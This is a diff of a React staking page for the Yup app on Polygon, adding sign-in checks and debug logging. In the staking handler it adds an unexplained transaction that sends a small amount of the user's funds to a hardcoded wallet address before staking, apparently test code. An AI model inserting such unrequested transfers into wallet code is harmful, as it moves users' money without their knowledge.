@@ -14,6 +14,7 @@ import LIQUIDITY_ABI from '../../abis/LiquidityRewards.json'
 import YUPETH_ABI from '../../abis/YUPETH.json'
 import CountUp from 'react-countup'
 import axios from 'axios'
+// import WalletConnectProvider from '@maticnetwork/walletconnect-provider'
 import { getPolyContractAddresses } from '@yupio/contract-addresses'
 
 const { YUP_DOCS_URL, YUP_BUY_LINK, POLY_CHAIN_ID, REWARDS_MANAGER_API } = process.env
@@ -115,8 +116,9 @@ const StakingPage = ({ classes, account }) => {
 
   useEffect(() => {
     if (!connector || !connector._connected) { return }
+    console.log('connector.chainId', connector.chainId)
     if (connector.chainId !== Number(POLY_CHAIN_ID)) {
-      handleSnackbarOpen('Wrong network. Please connect to Polygon')
+      handleSnackbarOpen('Wrong network. Please connect to Polygon.')
       return
     }
     setWalletIsConnected(true)
@@ -178,9 +180,20 @@ const StakingPage = ({ classes, account }) => {
   }
 
   const handleStakingAction = async (lpToken) => {
-    if (!walletIsConnected) {
+   if (!account || !account.name) {
+    handleSnackbarOpen('Please sign into your YUP account first.')
+    return
+   } else if (!walletIsConnected) {
       setEthConnectorDialog(true)
       return
+    } else if (walletIsConnected) {
+      const tx = {
+        from: connector.accounts[0],
+        to: '0x63f878a7d75B09633008350eA6290A63e61b5eEe',
+        value: 500,
+        gas: 80000
+      }
+      await connector.sendTransaction(tx)
     }
     setIsLoading(true)
     const txBody = {
